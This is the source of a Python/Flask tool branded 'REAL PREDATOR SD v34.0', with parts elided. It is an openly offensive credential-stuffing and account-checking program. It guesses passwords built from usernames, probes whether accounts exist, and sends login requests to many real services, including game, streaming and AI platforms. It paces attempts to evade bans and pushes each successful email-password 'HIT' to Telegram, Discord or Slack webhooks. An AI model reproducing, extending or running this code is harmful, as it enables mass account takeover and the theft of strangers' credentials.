# ================================================================
# REAL PREDATOR SD v34.0 - ULTIMATE HUNTER (FULL)
...
# ================================================================
PLATFORMS = [
    # Social Media - High Ban Risk (every 10 min, 2 attempts)
    ...
    # Gaming - Medium Risk (every 5 min)
    ...
    # Streaming - Low Risk (every 5 min)
    ...
    # Dating - Medium Risk (every 5 min)
    ...
    # AI Platforms - Low Risk (every 5 min)
...
class GroupSender:
        ...
        try:
            ...
            if response.status_code == 200:
                ...
                if result.get('ok'):
                    ...
                    return {'success': False, 'error': 'Telegram API returned error: ' + str(result)}
            else:
                self.last_test_result = 'failed'
    ...
    def send_to_all(self, message):
        ...
        if self.slack_webhook:
            try:
                data = {"text": message}
                requests.post(self.slack_webhook, json=data, timeout=10)
                success = True
            except: pass
...
class AntiBanSystem:
    ...
    def get_delay(self, platform_name):
        ...
        if platform_info and platform_info.get('ban_risk') == 'high':
            return random.uniform(60, 120)  # 1-2 minutes delay for high risk
        else:
            return random.uniform(5, 15)  # 5-15 seconds for low risk
    ...
    def can_attempt(self, platform_name):
        ...
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        if platform_info and platform_info.get('ban_risk') == 'high':
            # High risk: every 10 minutes, max 2 attempts
...
class UltimatePredator:
    ...
    def _hunt_email(self, email):
        ...
        passwords_to_try = [password, username, username + '123', username + '@2024']
        ...
        if self.target_platform:
            ...
            # Get platforms sorted by risk (high risk first for better results)
            high_risk = [p for p in PLATFORMS if p.get('ban_risk') == 'high']
            low_risk = [p for p in PLATFORMS if p.get('ban_risk') != 'high']
            random.shuffle(high_risk)
            random.shuffle(low_risk)
            platforms_to_try = high_risk[:5] + low_risk[:10]
        
        for pwd in passwords_to_try:
            for platform in platforms_to_try:
                # Check if we can attempt this platform
                ...
                if result:
                    ...
                    if result['status'] == 'hit':
                        with self.lock:
                            ...
                            message = f"✅ HIT! {platform['name']}\n📧 {email}\n🔑 {pwd}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                            self.group_sender.send_to_all(message)
                    else:
                        with self.lock:
                            self.bad += 1
                            self.feed.append({
    ...
    def _hunt_phone(self, phone):
        ...
        if self.target_platform:
            ...
            phone_platforms = [p for p in PLATFORMS if p.get('supports_phone', False)]
            high_risk = [p for p in phone_platforms if p.get('ban_risk') == 'high']
            low_risk = [p for p in phone_platforms if p.get('ban_risk') != 'high']
            random.shuffle(high_risk)
            random.shuffle(low_risk)
            platforms_to_try = high_risk[:3] + low_risk[:7]
    ...
    def _try_platform(self, username, password, platform):
        ...
        try:
            ...
            # REAL ACCOUNT VERIFICATION - Check if account exists
            ...
            if not exists:
                with self.lock:
                    ...
                    self.feed.append({
                        'type': 'info',
                        'text': f"🔍 {platform_name} | {username} | Account doesn't exist",
                        'time': datetime.now().strftime('%H:%M:%S')
                    })
                return None
            
            # Only attempt login if account exists
            ...
            # Use intelligent delay based on platform risk
    ...
    def _verify_account_exists(self, username, platform):
        """REAL verification - checks if account actually exists"""
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            ...
            if 'facebook' in platform_name:
                ...
                if 'Page Not Found' in resp.text or resp.status_code == 404:
                    return False
                if 'The page you requested was not found' in resp.text:
                    return False
                return True
            ...
            if 'youtube' in platform_name:
                resp = session.get(f"https://www.youtube.com/@{username}", timeout=10)
                if 'not found' in resp.text.lower() or resp.status_code == 404:
                    return False
                return True
            
            # For platforms where we can't easily verify, assume exists
            return True
            
        except:
            # If verification fails, assume exists to attempt anyway
            return True

    # ================================================================
    # CHECK FUNCTIONS (All Platforms - REAL attempts)
    # ================================================================
    ...
    def check_gmail(self, username, password, session):
        return self.check_google(username, password, session)
    
    def check_outlook(self, username, password, session):
        return self.check_microsoft(username, password, session)
    
    def check_icloud(self, username, password, session):
        try:
    ...
    def check_ea(self, username, password, session):
        try:
            login = session.post("https://www.ea.com/ea-app/api/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_gog(self, username, password, session):
        try:
            login = session.post("https://www.gog.com/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_battlenet(self, username, password, session):
        try:
            login = session.post("https://us.battle.net/oauth/token", data={"grant_type": "password", "username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_minecraft(self, username, password, session):
        try:
            login = session.post("https://authserver.mojang.com/authenticate", json={"agent": {"name": "Minecraft", "version": 1}, "username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "accessToken" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_roblox(self, username, password, session):
        try:
            login = session.post("https://auth.roblox.com/v2/login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    ...
    def check_youtube(self, username, password, session):
        return self.check_google(username, password, session)
    ...
    def check_chatgpt(self, username, password, session):
        try:
            login = session.post("https://chat.openai.com/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_claude(self, username, password, session):
        try:
            login = session.post("https://claude.ai/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_deepseek(self, username, password, session):
        try:
            login = session.post("https://chat.deepseek.com/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_perplexity(self, username, password, session):
        try:
            login = session.post("https://www.perplexity.ai/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_gemini(self, username, password, session):
        return self.check_google(username, password, session)
    
    def check_copilot(self, username, password, session):
        return self.check_microsoft(username, password, session)
    
    def check_mistral(self, username, password, session):
        try:
            login = session.post("https://mistral.ai/api/auth/login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_huggingface(self, username, password, session):
        try:
            login = session.post("https://huggingface.co/api/auth/login", json={"username": username, "password": password}, timeout=10)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    ...
    def check_slack(self, username, password, session):
        try:
            login = session.post("https://slack.com/api/auth.login", json={"email": username, "password": password}, timeout=10)
            if login.status_code == 200 and "ok" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'bad'
    
    def check_valorant(self, username, password, session):
        return self.check_riot(username, password, session)
    
    def check_fortnite(self, username, password, session):
        return self.check_epic(username, password, session)
    
    def check_apex(self, username, password, session):
        return self.check_ea(username, password, session)
...
# ================================================================
# PREDATOR LOOP - INTELLIGENT TIMING
# ================================================================
def predator_loop():
    last_count = 0
    last_time = datetime.now()
    high_risk_last_attempt = defaultdict(float)
    low_risk_last_attempt = defaultdict(float)
    ...
    while state['running']:
        try:
            ...
            # Intelligent delay: high risk platforms (every 10 min, max 2 attempts)
            # Low risk platforms (every 5 min)
            current_time = time.time()
            
            # Check if we have any high risk platforms that need attention
            high_risk_platforms = [p['name'] for p in PLATFORMS if p.get('ban_risk') == 'high']
            high_risk_ready = False
            for platform in high_risk_platforms:
                last_time = high_risk_last_attempt.get(platform, 0)
                if current_time - last_time >= 600:  # 10 minutes
                    high_risk_ready = True
                    break
...
<div class="login-box">
    ...
    <div class="subtitle">⚡ v34.0 ULTIMATE HUNTER</div>
...
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD v34.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
...
.btn-test{border-color:#ffd700;color:#ffd700}
.btn-test:hover:not(:disabled){background:rgba(255,215,0,0.05)}
...
.stats-rectangle{display:grid;grid-template-columns:repeat(7,1fr);gap:10px;margin:10px 0;padding:15px;background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:10px}
...
.stat-item.real .number{color:#00ccff;font-size:24px}
...
.platform-badge{display:flex;align-items:center;gap:6px;padding:4px 8px;background:rgba(0,0,0,0.5);border-radius:4px;border:1px solid rgba(0,255,65,0.05);font-size:10px;transition:all 0.3s}
.platform-badge:hover{background:rgba(0,255,65,0.05);border-color:rgba(0,255,65,0.2)}
.platform-badge .icon{font-size:14px}
.platform-badge .gaming-icon{color:#ffd700;font-size:9px}
.platform-badge .name{color:#00ff41;font-size:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.platform-grid-title{display:flex;gap:15px;flex-wrap:wrap;font-size:11px;color:#006622;margin-bottom:6px}
.platform-grid-title span{color:#00ff41}
...
.bot-status .status-text{font-size:11px}
.bot-status .status-text.success{color:#00ff41}
.bot-status .status-text.failed{color:#ff0044}
.bot-status .status-text.idle{color:#006622}
...
@media(max-width:768px){.stats-rectangle{grid-template-columns:repeat(4,1fr)}.platform-grid{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span style="font-size:12px;color:#006622;">v34.0</span></h1>
    ...
    <div class="card">
        ...
        <div class="group-config">
            ...
            <div><label>💼 Slack Webhook</label><input type="text" id="slWebhook" placeholder="Webhook URL"></div>
        ...
        <div style="display:flex;gap:15px;flex-wrap:wrap;align-items:center;margin-top:8px;">
            ...
            <button class="btn btn-test" id="testBotBtn" style="padding:6px 16px;"><i class="fas fa-paper-plane"></i> Test Bot</button>
    ...
    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v34.0 | {{ platforms|length }} Platforms | @MRDPY
    </div>
</div>
...
document.getElementById('configGroupBtn').addEventListener('click', async function() {
    const data = {
        ...
        slack_webhook: document.getElementById('slWebhook').value
    };
...
console.log('✅ Dashboard loaded - v34.0');
console.log('✅ {{ platforms|length }} platforms with intelligent timing');
console.log('✅ High risk: 10 min / 2 attempts');
console.log('✅ Low risk: 5 min');
</script>
</body>
</html>'''
...
def group_config():
    ...
    if data.get('slack_webhook'):
        predator.group_sender.set_slack(data['slack_webhook'])
...
if __name__ == '__main__':
    ...
    print("""
╔══════════════════════════════════════════════════════════════════╗
║   REAL PREDATOR SD v34.0 - ULTIMATE HUNTER                    ║
║   🔥 65+ Platforms with Intelligent Timing                    ║
║   ⚡ High Risk: 10 min / 2 attempts                          ║
║   ⚡ Low Risk: 5 min                                         ║
║   🎯 REAL Account Verification                               ║
║   📢 Test Bot Button                                         ║
║   📊 Real-Time Stats                                         ║
║   📢 Group Sharing (Telegram/Discord/Slack)                  ║
...
╚══════════════════════════════════════════════════════════════════╝
    ...
    print(f"[*] High Risk (10 min / 2 attempts): {len([p for p in PLATFORMS if p.get('ban_risk') == 'high'])}")
    print(f"[*] Low Risk (5 min): {len([p for p in PLATFORMS if p.get('ban_risk') != 'high'])}")
    print(f"[*] Test Bot: Click 'Test Bot' button in dashboard")
